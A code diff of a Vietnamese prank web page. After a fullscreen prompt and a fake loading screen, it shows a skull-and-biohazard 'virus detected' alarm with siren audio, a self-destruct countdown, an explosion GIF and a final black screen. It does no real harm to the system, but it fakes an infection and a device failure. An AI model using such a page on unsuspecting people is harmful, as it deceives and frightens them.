@@ -3,102 +3,102 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Base</title>
+  <title>Cảnh Báo Tự Hủy</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    /* Font mặc định đồng bộ Arial, vô hiệu hóa chọn văn bản */
     body, * {
       font-family: Arial, Helvetica, sans-serif !important;
       user-select: none;
-      -webkit-user-select: none;
     }
 
-    /* Hiệu ứng quét dòng CRT cổ điển */
+    /* Hiệu ứng quét dòng CRT */
     .crt-scanlines {
       background: linear-gradient(
         to bottom,
         rgba(255, 255, 255, 0),
         rgba(255, 255, 255, 0) 50%,
-        rgba(0, 0, 0, 0.4) 50%,
-        rgba(0, 0, 0, 0.4)
+        rgba(0, 0, 0, 0.35) 50%,
+        rgba(0, 0, 0, 0.35)
       );
       background-size: 100% 4px;
       pointer-events: none;
     }
 
-    /* Flash chớp sáng hạt nhân cực mạnh */
-    @keyframes nuclear-flash {
-      0% { opacity: 1; background: #ffffff; }
-      15% { opacity: 0.95; background: #fff5e6; }
-      40% { opacity: 0.6; background: #ffaa44; }
-      100% { opacity: 0; background: transparent; }
-    }
-
-    .nuclear-flash-anim {
-      animation: nuclear-flash 1.2s cubic-bezier(0.1, 0.9, 0.2, 1) forwards;
-    }
-
-    /* Rung chấn màn hình khi sóng xung kích (Shockwave) ập tới */
-    @keyframes screen-shake {
-      0% { transform: translate(0, 0) scale(1.05); }
-      10% { transform: translate(-14px, 10px) scale(1.08); }
-      20% { transform: translate(12px, -12px) scale(1.06); }
-      30% { transform: translate(-10px, 8px) scale(1.07); }
-      40% { transform: translate(8px, -6px) scale(1.05); }
-      60% { transform: translate(-4px, 4px) scale(1.03); }
-      80% { transform: translate(3px, -2px) scale(1.01); }
+    /* Rung lắc dữ dội khi phát nổ */
+    @keyframes screen-quake {
+      0% { transform: translate(0, 0) scale(1); }
+      10% { transform: translate(-12px, 8px) scale(1.02); }
+      20% { transform: translate(14px, -10px) scale(0.99); }
+      30% { transform: translate(-10px, -12px) scale(1.03); }
+      40% { transform: translate(12px, 10px) scale(1); }
+      50% { transform: translate(-8px, 6px) scale(1.02); }
+      60% { transform: translate(10px, -6px) scale(0.99); }
+      70% { transform: translate(-6px, 8px) scale(1.01); }
+      80% { transform: translate(6px, -4px) scale(1); }
       100% { transform: translate(0, 0) scale(1); }
     }
 
-    .shockwave-shake {
-      animation: screen-shake 2.8s ease-out;
+    .shaking {
+      animation: screen-quake 0.12s infinite;
     }
 
-    /* Trạng thái tắt ngấm màn hình và ẩn hoàn toàn con trỏ chuột */
-    .hidden-cursor {
-      cursor: none !important;
+    /* Chớp sáng cực mạnh khi nổ */
+    @keyframes explosion-flash {
+      0% { opacity: 0.95; }
+      20% { opacity: 0.1; }
+      35% { opacity: 0.8; }
+      100% { opacity: 0; }
+    }
+
+    .flash-overlay {
+      animation: explosion-flash 0.5s ease-out forwards;
     }
   </style>
 </head>
-<body class="w-screen h-screen m-0 p-0 bg-white flex items-center justify-center overflow-hidden transition-colors duration-200">
+<body id="main-body" class="w-screen h-screen m-0 p-0 bg-white flex items-center justify-center overflow-hidden transition-colors duration-200">
 
-  <!-- ==================== BƯỚC 1: BẬT TOÀN MÀN HÌNH ==================== -->
-  <section id="screen-fullscreen" class="flex flex-col items-center justify-center w-full h-full text-center px-4">
+  <!-- ==================== 0. MÀN HÌNH YÊU CẦU TOÀN MÀN HÌNH ==================== -->
+  <section id="step-fullscreen-prompt" class="flex flex-col items-center justify-center w-full h-full text-center px-4">
+    <p class="text-gray-700 text-base mb-4 font-normal">Vui lòng bật toàn màn hình để tiếp tục</p>
     <button 
       id="btn-fullscreen" 
-      class="px-6 py-2.5 bg-gray-900 hover:bg-black active:bg-gray-800 text-white text-base font-normal rounded cursor-pointer transition-colors shadow-sm outline-none border-none"
+      class="px-6 py-2.5 bg-gray-900 hover:bg-black active:scale-95 text-white text-base font-normal rounded cursor-pointer transition-all shadow-sm outline-none border-none"
     >
       Bật toàn màn hình
     </button>
   </section>
 
-  <!-- ==================== BƯỚC 2: NÚT TỐI GIẢN "BẤM VÀO ĐÂY" ==================== -->
-  <section id="screen-trigger" class="hidden flex items-center justify-center w-full h-full">
+  <!-- ==================== 1. MÀN HÌNH BẮT ĐẦU: TỐI GIẢN ==================== -->
+  <section id="step-start" class="hidden flex items-center justify-center w-full h-full">
     <button 
-      id="btn-trigger" 
-      class="px-6 py-2.5 bg-blue-600 hover:bg-blue-700 active:bg-blue-800 text-white text-base font-normal rounded cursor-pointer transition-colors shadow-sm outline-none border-none"
+      id="btn-click" 
+      class="px-6 py-2.5 bg-blue-600 hover:bg-blue-700 active:scale-95 text-white text-base font-normal rounded cursor-pointer transition-all shadow-sm outline-none border-none"
     >
       Bấm vào đây
     </button>
   </section>
 
-  <!-- ==================== BƯỚC 3: LOADING TRONG 3 GIÂY ==================== -->
-  <section id="screen-loading" class="hidden flex flex-col items-center justify-center gap-3">
-    <div class="w-12 h-12 border-4 border-gray-200 border-t-blue-600 rounded-full animate-spin"></div>
+  <!-- ==================== 2. MÀN HÌNH LOADING TRONG 3 GIÂY ==================== -->
+  <section id="step-loading" class="hidden flex-col items-center justify-center gap-3">
+    <div class="w-10 h-10 border-4 border-gray-200 border-t-blue-600 rounded-full animate-spin"></div>
     <span class="text-sm text-gray-500 font-normal">Đang tải...</span>
   </section>
 
-  <!-- ==================== BƯỚC 4: ĐỒ HỌA MÀN HÌNH CRT NGUY HIỂM ==================== -->
-  <section id="screen-graphics" class="hidden absolute inset-0 w-full h-full bg-black flex items-center justify-center overflow-hidden">
+  <!-- ==================== 3. MÀN HÌNH ĐỒ HỌA MÁY TÍNH & ĐẦU LÂU ☠ ==================== -->
+  <section id="step-graphic" class="hidden absolute inset-0 w-full h-full bg-black flex items-center justify-center overflow-hidden">
+    <!-- Lớp lưới sọc quét CRT -->
     <div class="crt-scanlines absolute inset-0 z-20"></div>
 
-    <svg id="svg-display" viewBox="0 0 1920 1080" class="w-full h-full max-w-full max-h-full object-contain" preserveAspectRatio="xMidYMid slice">
+    <!-- Đồ họa Vector SVG -->
+    <svg id="scene-svg" viewBox="0 0 1920 1080" class="w-full h-full max-w-full max-h-full object-contain" preserveAspectRatio="xMidYMid slice">
       <defs>
+        <!-- Họa tiết dải sọc chéo Hazard đỏ và đen -->
         <pattern id="hazardStripes" width="160" height="160" patternTransform="rotate(45 0 0)" patternUnits="userSpaceOnUse">
           <line x1="0" y1="0" x2="0" y2="160" stroke="#990b14" stroke-width="80" />
           <line x1="80" y1="0" x2="80" y2="160" stroke="#0f0506" stroke-width="80" />
         </pattern>
 
+        <!-- Ký hiệu Nguy Hiểm Sinh Học (Biohazard) -->
         <g id="biohazard-symbol" fill="#000000" fill-opacity="0.82">
           <circle cx="0" cy="-35" r="30" />
           <circle cx="-30" cy="20" r="30" />
@@ -114,18 +114,21 @@
           <circle cx="30" cy="20" r="24" fill="#990b14" opacity="0.32"/>
         </g>
 
+        <!-- Biển Cảnh Báo Tam Giác Vàng Chấm Than -->
         <g id="warning-triangle">
           <polygon points="0,-185 160,105 -160,105" fill="#000000" stroke="#000000" stroke-width="14" stroke-linejoin="round" />
           <polygon points="0,-175 148,97 -148,97" fill="#fde047" stroke="#000000" stroke-width="8" stroke-linejoin="round" />
-          <polygon points="0,-155 130,85 -130,85" fill="none" stroke="#333333" stroke-width="3" stroke-linejoin="round" opacity="0.35" />
+          <polygon points="0,-155 130,85 -130,85" fill="none" stroke="#333333" stroke-width="3" stroke-linejoin="round" opacity="0.4" />
           <path d="M-9,-95 L9,-95 L6,15 L-6,15 Z" fill="#000000" />
           <circle cx="0" cy="50" r="11" fill="#000000" />
         </g>
       </defs>
 
+      <!-- Nền sọc Hazard đỏ đen -->
       <rect width="1920" height="1080" fill="url(#hazardStripes)" />
-      <rect width="1920" height="1080" fill="rgba(0,0,0,0.2)" />
+      <rect width="1920" height="1080" fill="rgba(0,0,0,0.18)" />
 
+      <!-- Các biểu tượng Biohazard phân bổ nền trái và phải -->
       <use href="#biohazard-symbol" transform="translate(230, 210) scale(1.6)" />
       <use href="#biohazard-symbol" transform="translate(280, 500) scale(1.7)" />
       <use href="#biohazard-symbol" transform="translate(210, 810) scale(1.6)" />
@@ -134,12 +137,14 @@
       <use href="#biohazard-symbol" transform="translate(1670, 520) scale(1.7)" />
       <use href="#biohazard-symbol" transform="translate(1640, 820) scale(1.6)" />
 
-      <!-- MÀN HÌNH MÁY TÍNH TRUNG TÂM -->
-      <g transform="translate(960, 540)">
+      <!-- MÁY TÍNH CRT CỔ ĐIỂN Ở TRUNG TÂM -->
+      <g transform="translate(960, 520)">
+        <!-- Chân đế máy tính -->
         <path d="M-280,410 L280,410 L220,335 L-220,335 Z" fill="#2d2b78" stroke="#100f36" stroke-width="6" />
         <path d="M-220,335 L220,335 L160,250 L-160,250 Z" fill="#353496" stroke="#100f36" stroke-width="5" />
         <rect x="-140" y="210" width="280" height="48" fill="#282672" stroke="#100f36" stroke-width="5" />
 
+        <!-- Vỏ ngoài màn hình CRT xanh tím -->
         <rect x="-500" y="-450" width="1000" height="690" rx="16" fill="#3836a0" stroke="#0e0c3b" stroke-width="12" />
         <g stroke="#262474" stroke-width="4">
           <line x1="-480" y1="-420" x2="480" y2="-420" />
@@ -149,8 +154,10 @@
         </g>
         <rect x="-420" y="-380" width="840" height="550" rx="8" fill="#1d1b5a" stroke="#090825" stroke-width="8" />
 
+        <!-- Màn hình bên trong màu đỏ cảnh báo -->
         <rect x="-370" y="-330" width="740" height="450" fill="#dc2626" stroke="#ffffff" stroke-width="10" />
         
+        <!-- Các vệt quét đen trên nền đỏ -->
         <g stroke="#000000" stroke-width="5" opacity="0.65">
           <line x1="-370" y1="-280" x2="370" y2="-280" />
           <line x1="-370" y1="-220" x2="370" y2="-220" />
@@ -161,425 +168,89 @@
           <line x1="-370" y1="80" x2="370" y2="80" />
         </g>
 
-        <!-- ĐẦU LÂU RETRO -->
-        <g fill="#ffffff" stroke="#000000" stroke-width="3">
-          <circle cx="-135" cy="-95" r="16" /><circle cx="-100" cy="-125" r="16" />
-          <circle cx="135" cy="95" r="16" /><circle cx="100" cy="125" r="16" />
-          <rect x="-115" y="-105" width="230" height="28" transform="rotate(35)" rx="6" />
+        <!-- ĐẦU LÂU XƯƠNG CHÉO (☠) HOÀN CHỈNH NẰM GỌN TRONG MÀN HÌNH -->
+        <g id="skull-and-crossbones" transform="translate(0, -115)">
+          <!-- Xương chéo góc 1: Tây Bắc - Đông Nam -->
+          <g transform="rotate(38)" fill="#ffffff" stroke="#000000" stroke-width="4" stroke-linejoin="round">
+            <rect x="-140" y="-14" width="280" height="28" rx="6" />
+            <circle cx="-140" cy="-14" r="17" />
+            <circle cx="-140" cy="14" r="17" />
+            <circle cx="140" cy="-14" r="17" />
+            <circle cx="140" cy="14" r="17" />
+          </g>
 
-          <circle cx="135" cy="-95" r="16" /><circle cx="100" cy="-125" r="16" />
-          <circle cx="-135" cy="95" r="16" /><circle cx="-100" cy="125" r="16" />
-          <rect x="-115" y="-105" width="230" height="28" transform="rotate(-35)" rx="6" />
+          <!-- Xương chéo góc 2: Đông Bắc - Tây Nam -->
+          <g transform="rotate(-38)" fill="#ffffff" stroke="#000000" stroke-width="4" stroke-linejoin="round">
+            <rect x="-140" y="-14" width="280" height="28" rx="6" />
+            <circle cx="-140" cy="-14" r="17" />
+            <circle cx="-140" cy="14" r="17" />
+            <circle cx="140" cy="-14" r="17" />
+            <circle cx="140" cy="14" r="17" />
+          </g>
 
-          <ellipse cx="0" cy="-80" rx="90" ry="85" />
-          <rect x="-55" y="-20" width="110" height="65" rx="14" />
-          
-          <ellipse cx="-35" cy="-80" rx="22" ry="24" fill="#000000" stroke="none" />
-          <ellipse cx="35" cy="-80" rx="22" ry="24" fill="#000000" stroke="none" />
-          <path d="M-8,-45 L8,-45 L0,-62 Z" fill="#000000" stroke="none" />
+          <!-- Hộp sọ chính nằm đè lên trên xương chéo -->
+          <g fill="#ffffff" stroke="#000000" stroke-width="4">
+            <!-- Vòm sọ trên -->
+            <ellipse cx="0" cy="-25" rx="92" ry="85" />
+            <!-- Phần hàm má dưới -->
+            <path d="M -54,-15 L -46,55 Q 0,66 46,55 L 54,-15 Z" />
 
-          <g fill="#ffffff" stroke="#000000" stroke-width="3">
-            <rect x="-40" y="10" width="16" height="22" rx="3" />
-            <rect x="-20" y="10" width="16" height="22" rx="3" />
-            <rect x="4" y="10" width="16" height="22" rx="3" />
-            <rect x="24" y="10" width="16" height="22" rx="3" />
+            <!-- Hốc mắt to đen -->
+            <ellipse cx="-34" cy="-24" rx="22" ry="25" fill="#000000" stroke="none" />
+            <ellipse cx="34" cy="-24" rx="22" ry="25" fill="#000000" stroke="none" />
+
+            <!-- Hốc mũi hình tam giác đảo -->
+            <path d="M-8,14 L8,14 L0,0 Z" fill="#000000" stroke="none" />
+
+            <!-- Hàm răng (4 chiếc răng đều) -->
+            <g fill="#ffffff" stroke="#000000" stroke-width="3">
+              <rect x="-36" y="32" width="16" height="22" rx="3" />
+              <rect x="-18" y="32" width="16" height="22" rx="3" />
+              <rect x="2" y="32" width="16" height="22" rx="3" />
+              <rect x="20" y="32" width="16" height="22" rx="3" />
+            </g>
           </g>
         </g>
 
-        <rect x="-280" y="70" width="560" height="18" fill="#ffffff" stroke="#000000" stroke-width="2" />
+        <!-- Thanh progress bar phía dưới nằm trọn trong lòng màn hình đỏ -->
+        <rect x="-270" y="40" width="540" height="18" fill="#ffffff" stroke="#000000" stroke-width="3" rx="4" />
       </g>
 
-      <!-- 2 BIỂN CẢNH BÁO TAM GIÁC VÀNG -->
-      <g id="warning-layer" class="hidden">
+      <!-- 2 BIỂN CẢNH BÁO TAM GIÁC (THU NHỎ & DẠT SANG HAI CÁNH) -->
+      <g id="warning-signs" class="hidden">
         <use href="#warning-triangle" transform="translate(230, 540) scale(1.15)" />
         <use href="#warning-triangle" transform="translate(1690, 540) scale(1.15)" />
       </g>
     </svg>
   </section>
 
-  <!-- ==================== BƯỚC 5: NỀN ĐEN CHỮ ĐỎ ĐẾM NGƯỢC ==================== -->
-  <section id="screen-countdown" class="hidden absolute inset-0 w-full h-full bg-black flex items-center justify-center">
+  <!-- ==================== 4. MÀN HÌNH NỀN ĐEN CHỮ ĐỎ ĐẾM LÙI ==================== -->
+  <section id="step-countdown" class="hidden absolute inset-0 w-full h-full bg-black flex items-center justify-center">
     <h1 id="countdown-text" class="text-red-600 font-bold text-4xl sm:text-6xl md:text-7xl tracking-wider text-center px-4">
       TỰ HUỶ TRONG 3
     </h1>
   </section>
 
-  <!-- ==================== BƯỚC 6: ATOMIC EXPLOSION MEME TOÀN MÀN HÌNH ==================== -->
-  <section id="screen-explosion" class="hidden absolute inset-0 w-full h-full bg-black flex items-center justify-center overflow-hidden">
-    <!-- Container chứa video/ảnh nổ hạt nhân để rung chấn (shockwave shake) -->
-    <div id="explosion-wrapper" class="relative w-full h-full flex items-center justify-center overflow-hidden">
-      <!-- Video Atomic Explosion Meme Plantilla (YouTube 7LD-WsfQsv0) -->
-      <iframe 
-        id="atomic-video"
-        class="absolute w-[120vw] h-[120vh] max-w-none pointer-events-none scale-110 object-cover"
-        src=""
-        title="Atomic Explosion"
-        frameborder="0"
-        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
-        allowfullscreen
-      ></iframe>
+  <!-- ==================== 5. MÀN HÌNH KẾT THÚC: GIF NỔ TOÀN MÀN HÌNH ==================== -->
+  <section id="step-explosion" class="hidden absolute inset-0 w-full h-full bg-black flex items-center justify-center overflow-hidden">
+    <!-- Ảnh GIF toàn màn hình -->
+    <img 
+      id="explosion-gif"
+      src="https://i.pinimg.com/originals/48/bc/a3/48bca33b14b5609d2da2552527a513a9.gif" 
+      alt="Explosion GIF" 
+      class="absolute inset-0 w-full h-full object-cover z-0 pointer-events-none"
+    />
 
-      <!-- Hình ảnh dự phòng Shockwave Explosion nếu video chưa kịp stream -->
-      <img 
-        id="explosion-fallback" 
-        src="https://i.pinimg.com/originals/48/bc/a3/48bca33b14b5609d2da2552527a513a9.gif"
-        alt="Atomic Shockwave"
-        class="absolute inset-0 w-full h-full object-cover z-0 pointer-events-none opacity-90 mix-blend-screen"
-      />
-    </div>
-
-    <!-- Chớp sáng trắng xóa toàn màn hình lúc bom phát nổ -->
-    <div id="flash-effect" class="absolute inset-0 bg-white pointer-events-none z-30 hidden"></div>
+    <!-- Chớp sáng trắng khi nổ -->
+    <div id="flash-effect" class="absolute inset-0 bg-white pointer-events-none z-10 hidden"></div>
   </section>
 
-  <!-- ==================== BƯỚC 7: MÀN HÌNH ĐEN HOÀN TOÀN VĨNH VIỄN ==================== -->
-  <section id="screen-blackout" class="hidden absolute inset-0 w-full h-full bg-black z-50 hidden-cursor"></section>
+  <!-- ==================== 6. MÀN HÌNH ĐEN HOÀN TOÀN (SAU KHI NỔ XONG) ==================== -->
+  <section id="step-blackout" class="hidden absolute inset-0 w-full h-full bg-black z-50 pointer-events-none"></section>
 
-  <!-- ==================== KỊCH BẢN ĐIỀU KHIỂN ==================== -->
+  <!-- ==================== LOGIC KỊCH BẢN CHÍNH & HIỆU ỨNG ÂM THANH ==================== -->
   <script>
-    const screenFullscreen = document.getElementById('screen-fullscreen');
-    const screenTrigger = document.getElementById('screen-trigger');
-    const screenLoading = document.getElementById('screen-loading');
-    const screenGraphics = document.getElementById('screen-graphics');
-    const screenCountdown = document.getElementById('screen-countdown');
-    const screenExplosion = document.getElementById('screen-explosion');
-    const screenBlackout = document.getElementById('screen-blackout');
-
-    const btnFullscreen = document.getElementById('btn-fullscreen');
-    const btnTrigger = document.getElementById('btn-trigger');
-    const warningLayer = document.getElementById('warning-layer');
-    const countdownText = document.getElementById('countdown-text');
-    const atomicVideo = document.getElementById('atomic-video');
-    const explosionWrapper = document.getElementById('explosion-wrapper');
-    const flashEffect = document.getElementById('flash-effect');
-
-    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
-    let audioCtx = null;
-    let sirenInterval = null;
-    let isSirenActive = false;
-
-    // Âm thanh giọng nói Avast 4.8 chính thức
-    const avastAudioUrl = 'https://www.myinstants.com/media/sounds/avast-4-8-caution-a-virus-has-been-detected.mp3';
-    const avastAudio = new Audio(avastAudioUrl);
-    avastAudio.loop = true;
-    avastAudio.preload = 'auto';
-
-    // Âm thanh nuke nổ meme từ MyInstants
-    const nukeAudioUrl = 'https://www.myinstants.com/media/sounds/nuke-bomb.mp3';
-    const nukeAudio = new Audio(nukeAudioUrl);
-    nukeAudio.preload = 'auto';
-
-    function ensureAudioContext() {
-      if (!audioCtx) {
-        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-      }
-      if (audioCtx.state === 'suspended') {
-        audioCtx.resume();
-      }
-      return audioCtx;
-    }
-
-    // Tiếng đếm ngược BEEP
-    function playCountdownBeep(freq = 880, duration = 0.15) {
-      try {
-        const ctx = ensureAudioContext();
-        const osc = ctx.createOscillator();
-        const gain = ctx.createGain();
-
-        osc.type = 'sine';
-        osc.frequency.setValueAtTime(freq, ctx.currentTime);
-
-        gain.gain.setValueAtTime(0.35, ctx.currentTime);
-        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
-
-        osc.connect(gain);
-        gain.connect(ctx.destination);
-
-        osc.start();
-        osc.stop(ctx.currentTime + duration);
-      } catch (e) {
-        console.warn('Beep error:', e);
-      }
-    }
-
-    // =========================================================================
-    // SFX VỤ NỔ NGUYÊN TỬ (ATOMIC EXPLOSION & SHOCKWAVE BLAST MEME)
-    // Mô phỏng chính xác video meme 7LD-WsfQsv0:
-    // 1. Cú nổ kích nổ ban đầu (Initial Detonation Blast) cực mạnh, đinh tai
-    // 2. Tiếng gầm rú của sóng xung kích (Deafening Shockwave & Roaring Wind)
-    // 3. Sub-bass rung rền ở tần số cực thấp (25Hz) tạo độ rung
-    // =========================================================================
-    function triggerAtomicShockwaveSFX() {
-      // Phát audio meme nuke nếu sẵn sàng
-      try {
-        nukeAudio.currentTime = 0;
-        nukeAudio.volume = 1.0;
-        nukeAudio.play().catch(() => {});
-      } catch (e) {}
-
-      // Bộ tổng hợp Web Audio API (Chạy độc lập, không phụ thuộc kết nối mạng)
-      try {
-        const ctx = ensureAudioContext();
-        const now = ctx.currentTime;
-        const totalDuration = 3.6;
-
-        // 1. TẠO TIẾNG GIÓ GẦM CỦA SÓNG XUNG KÍCH (Brownian / Lowpass Wind Shockwave)
-        const bufferSize = ctx.sampleRate * totalDuration;
-        const noiseBuffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
-        const data = noiseBuffer.getChannelData(0);
-        let lastOut = 0.0;
-        for (let i = 0; i < bufferSize; i++) {
-          const white = Math.random() * 2 - 1;
-          // Lọc kiểu Brown noise cho tiếng gầm dày
-          data[i] = (lastOut + (0.02 * white)) / 1.02;
-          lastOut = data[i];
-          data[i] *= 3.8;
-        }
-
-        const noiseSrc = ctx.createBufferSource();
-        noiseSrc.buffer = noiseBuffer;
-
-        // Bộ lọc tần số quét (Filter Sweep) tạo cảm giác luồng hơi ép tới
-        const sweepFilter = ctx.createBiquadFilter();
-        sweepFilter.type = 'lowpass';
-        sweepFilter.frequency.setValueAtTime(1400, now);
-        sweepFilter.frequency.exponentialRampToValueAtTime(180, now + 1.4);
-        sweepFilter.frequency.exponentialRampToValueAtTime(40, now + totalDuration);
-
-        const noiseGain = ctx.createGain();
-        // Nổ bùng lên ngay lập tức rồi giữ độ rền của sóng xung kích
-        noiseGain.gain.setValueAtTime(0.1, now);
-        noiseGain.gain.linearRampToValueAtTime(1.0, now + 0.04);
-        noiseGain.gain.exponentialRampToValueAtTime(0.7, now + 1.2);
-        noiseGain.gain.exponentialRampToValueAtTime(0.001, now + totalDuration);
-
-        noiseSrc.connect(sweepFilter);
-        sweepFilter.connect(noiseGain);
-        noiseGain.connect(ctx.destination);
-        noiseSrc.start(now);
-        noiseSrc.stop(now + totalDuration);
-
-        // 2. SUB-BASS DETONATION BOOM (Xung kích siêu trầm)
-        const subOsc = ctx.createOscillator();
-        const subGain = ctx.createGain();
-
-        subOsc.type = 'sine';
-        subOsc.frequency.setValueAtTime(120, now);
-        subOsc.frequency.exponentialRampToValueAtTime(25, now + 1.8);
-
-        subGain.gain.setValueAtTime(1.0, now);
-        subGain.gain.exponentialRampToValueAtTime(0.001, now + 2.5);
-
-        subOsc.connect(subGain);
-        subGain.connect(ctx.destination);
-        subOsc.start(now);
-        subOsc.stop(now + 2.5);
-
-        // 3. TIẾNG ĐANH GẮNG CỰC ĐẠI (Distorted Blast Impact)
-        const clickOsc = ctx.createOscillator();
-        const clickGain = ctx.createGain();
-        clickOsc.type = 'sawtooth';
-        clickOsc.frequency.setValueAtTime(280, now);
-        clickOsc.frequency.exponentialRampToValueAtTime(50, now + 0.25);
-
-        clickGain.gain.setValueAtTime(0.8, now);
-        clickGain.gain.exponentialRampToValueAtTime(0.001, now + 0.25);
-
-        clickOsc.connect(clickGain);
-        clickGain.connect(ctx.destination);
-        clickOsc.start(now);
-        clickOsc.stop(now + 0.25);
-
-      } catch (e) {
-        console.warn('Atomic SFX synthesis failed:', e);
-      }
-    }
-
-    // Còi hú Avast 4.8 Wee-Woo
-    function startAvastSirenLoop() {
-      if (isSirenActive) return;
-      isSirenActive = true;
-
-      try {
-        const ctx = ensureAudioContext();
-        let toneHigh = true;
-        const playTone = () => {
-          if (!isSirenActive || !audioCtx) return;
-          const osc = audioCtx.createOscillator();
-          const gain = audioCtx.createGain();
-          
-          osc.type = 'sawtooth';
-          osc.frequency.setValueAtTime(toneHigh ? 960 : 770, audioCtx.currentTime);
-          gain.gain.setValueAtTime(0.22, audioCtx.currentTime);
-          gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.18);
-
-          osc.connect(gain);
-          gain.connect(audioCtx.destination);
-
-          osc.start();
-          osc.stop(audioCtx.currentTime + 0.18);
-          toneHigh = !toneHigh;
-        };
-
-        playTone();
-        sirenInterval = setInterval(playTone, 190);
-      } catch (e) {
-        console.warn('AudioContext siren failed:', e);
-      }
-
-      avastAudio.currentTime = 0;
-      avastAudio.play().catch(() => {
-        speakFallbackLoop();
-      });
-    }
-
-    function speakFallbackLoop() {
-      if (!isSirenActive || !('speechSynthesis' in window)) return;
-      const speak = () => {
-        if (!isSirenActive) return;
-        const utterance = new SpeechSynthesisUtterance("Caution! A virus has been detected!");
-        utterance.lang = 'en-US';
-        utterance.pitch = 1.15;
-        utterance.rate = 1.0;
-        utterance.onend = () => {
-          if (isSirenActive) setTimeout(speak, 500);
-        };
-        window.speechSynthesis.speak(utterance);
-      };
-      speak();
-    }
-
-    function stopAllAlertSounds() {
-      isSirenActive = false;
-      if (sirenInterval) {
-        clearInterval(sirenInterval);
-        sirenInterval = null;
-      }
-      try {
-        avastAudio.pause();
-        avastAudio.currentTime = 0;
-      } catch (e) {}
-
-      if ('speechSynthesis' in window) {
-        window.speechSynthesis.cancel();
-      }
-    }
-
-    // BƯỚC 1: Bật toàn màn hình
-    btnFullscreen.addEventListener('click', async () => {
-      try {
-        if (!document.fullscreenElement) {
-          if (document.documentElement.requestFullscreen) {
-            await document.documentElement.requestFullscreen();
-          } else if (document.documentElement.webkitRequestFullscreen) {
-            await document.documentElement.webkitRequestFullscreen();
-          } else if (document.documentElement.msRequestFullscreen) {
-            await document.documentElement.msRequestFullscreen();
-          }
-        }
-      } catch (err) {
-        console.warn('Fullscreen request failed:', err);
-      }
-
-      ensureAudioContext();
-      try {
-        avastAudio.load();
-        nukeAudio.load();
-      } catch (e) {}
-
-      screenFullscreen.classList.add('hidden');
-      screenFullscreen.classList.remove('flex');
-      screenTrigger.classList.remove('hidden');
-      screenTrigger.classList.add('flex');
-    }, { once: true });
-
-    // BƯỚC 2 -> 7: Kịch bản chính
-    btnTrigger.addEventListener('click', async () => {
-      // 1. Loading 3 giây
-      screenTrigger.classList.add('hidden');
-      screenTrigger.classList.remove('flex');
-      screenLoading.classList.remove('hidden');
-      screenLoading.classList.add('flex');
-
-      await sleep(3000);
-
-      // 2. Màn hình Virus chuyển đổi 5 lần (1s mỗi lần)
-      screenLoading.classList.add('hidden');
-      screenLoading.classList.remove('flex');
-      screenGraphics.classList.remove('hidden');
-
-      let warningActive = false;
-      warningLayer.classList.add('hidden');
-
-      for (let i = 0; i < 5; i++) {
-        await sleep(1000);
-        warningActive = !warningActive;
-
-        if (warningActive) {
-          warningLayer.classList.remove('hidden');
-          startAvastSirenLoop();
-        } else {
-          warningLayer.classList.add('hidden');
-        }
-      }
-
-      await sleep(1000);
-
-      // 3. Dừng còi hú, chuyển sang màn hình chữ đỏ đếm ngược
-      stopAllAlertSounds();
-      screenGraphics.classList.add('hidden');
-
-      screenCountdown.classList.remove('hidden');
-      screenCountdown.classList.add('flex');
-
-      countdownText.textContent = "TỰ HUỶ TRONG 3";
-      playCountdownBeep(750, 0.2);
-      await sleep(1000);
-
-      countdownText.textContent = "TỰ HUỶ TRONG 2";
-      playCountdownBeep(750, 0.2);
-      await sleep(1000);
-
-      countdownText.textContent = "TỰ HUỶ TRONG 1";
-      playCountdownBeep(1050, 0.35);
-      await sleep(1000);
-
-      // 4. BÙNG NỔ ATOMIC EXPLOSION SHOCKWAVE (YouTube 7LD-WsfQsv0)
-      screenCountdown.classList.add('hidden');
-      screenCountdown.classList.remove('flex');
-
-      // Kích hoạt video meme hạt nhân (tắt controls, autoplay, bắt đầu ngay khoảnh khắc phát nổ)
-      atomicVideo.src = "https://www.youtube-nocookie.com/embed/7LD-WsfQsv0?autoplay=1&controls=0&mute=0&modestbranding=1&rel=0&start=0";
-
-      screenExplosion.classList.remove('hidden');
-      screenExplosion.classList.add('flex');
-
-      // Kích hoạt hiệu ứng âm thanh tiếng nổ nấm nguyên tử + sóng xung kích cuồng phong
-      triggerAtomicShockwaveSFX();
-
-      // Hiệu ứng chớp sáng hạt nhân và rung chấn màn hình
-      flashEffect.classList.remove('hidden');
-      flashEffect.classList.add('nuclear-flash-anim');
-      explosionWrapper.classList.add('shockwave-shake');
-
-      // Thời lượng sóng xung kích của quả bom nổ quét qua (khoảng 3.5 giây đúng theo meme)
-      await sleep(3500);
-
-      // 5. CẮT ĐỘT NGỘT: Tắt tiếng, ngắt video và đen ngòm màn hình vĩnh viễn
-      atomicVideo.src = "";
-      try {
-        nukeAudio.pause();
-        nukeAudio.currentTime = 0;
-      } catch (e) {}
-
-      screenExplosion.classList.add('hidden');
-      screenExplosion.classList.remove('flex');
-
-      screenBlackout.classList.remove('hidden');
-      document.body.style.backgroundColor = '#000000';
-      document.body.classList.add('hidden-cursor');
-    }, { once: true });
